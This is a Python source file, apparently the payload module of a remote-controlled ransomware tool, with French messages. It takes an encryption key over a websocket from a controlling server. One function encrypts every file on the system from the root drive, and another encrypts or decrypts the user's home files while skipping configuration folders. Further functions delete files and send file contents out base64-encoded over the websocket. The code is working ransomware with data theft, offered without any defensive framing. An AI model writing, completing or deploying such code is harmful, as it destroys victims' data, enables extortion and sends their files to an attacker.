import shutil
from pathlib import Path
from types import TracebackType
from cryptography.fernet import Fernet
import websockets,json
import os,base64

def is_file_dir(file):
    p = Path(file)
    if not p.exists():
        return None
    if p.is_dir():
        return "D"
    if p.is_file():
        return "F"
    return None

def rm(file):
    p = Path(file)
    verif = is_file_dir(file)

    if verif == "D":
        try:
            shutil.rmtree(p)
            return f"{file} Delete avec succes"
        except Exception as e:
            return f"erreur suppression dossier {file}: {e}"

    elif verif == "F":
        try:
            p.unlink()
            return f"{file} Delete avec succes"
        except Exception as e:
            return f"erreur suppression fichier {file}: {e}"

    else:
        return f"{file} not found check name please"



async def get_key(ws):
    r = await ws.recv()
    if not r:
        return None
    try:
        if isinstance(r, bytes):
            r = r.decode()
        data = json.loads(r)
        key_str = data.get("key")
        if not key_str:
            return None
        return key_str.encode()
    except:
        return None

async def encrypt_file(file,key):
    if not key:
        return "Key Not found"

    try:
        f = Fernet(key)
    except Exception as e:
        return f"Bad key: {e}"

    p = Path(file)
    if not p.exists():
        return f"{file} not found"
    if p.is_dir():
        return "dir can't be encrypt"

    try:
        data = p.read_bytes()
        p.write_bytes(f.encrypt(data))
        return f"{file} encrypt ok"
    except Exception as e:
        return f"error: {e}"

async def decrypt_file(file,key):
    if not key:
        return "Key Not found"

    try:
        f = Fernet(key)
    except Exception as e:
        return f"Bad key: {e}"

    p = Path(file)
    if not p.exists():
        return f"{file} not found"
    if p.is_dir():
        return "dir can't be decrypt"

    try:
        data = p.read_bytes()
        p.write_bytes(f.decrypt(data))
        return f"{file} decrypt ok"
    except Exception as e:
        return f"error: {e}"



async def chiff_all(key):
    osname_path = "/" if os.name != "nt" else "C:\\"
    root = Path(osname_path)

    try:
        for dossier, _, files in os.walk(root, onerror=lambda e: None):
            for n in files:
                ch = os.path.join(dossier, n)
                await encrypt_file(ch,key)
        return "fini avec succes"
    except Exception as e:
        return f"error:{e}"
    


async def home_user_only(key,cmd_type):
    home = Path.home()
    ignore_dirs = {".config", ".cache", ".local", ".mozilla", "snap", ".pki", ".gnupg", "__pycache__", ".steam", ".var"}

    try:
        for dossier, dirs, files in os.walk(home, onerror=lambda e: None, topdown=True):
            dirs[:] = [d for d in dirs if not d.startswith(".") and d not in ignore_dirs]

    
            for n in files:
                if n.startswith("."):
                    continue
                chemin = os.path.join(dossier, n)
                if cmd_type == "enc":
                    res = await encrypt_file(chemin,key)
                
                elif cmd_type == "dec":
                    res = await decrypt_file(chemin,key)
        return "fini avec succes"
    except Exception as e:
        return f"error:{e}"
        


                
        return "fini"


async def send_file(file, ws):
    p = Path(file)
    if not p.exists():
        return "not found"
    if not p.is_file():
        return "c'est pas un file"
    data = p.read_bytes()
    b64 = base64.b64encode(data)
    await ws.send(json.dumps({"file_name":p.name,"result":b64.decode()}))

    
    
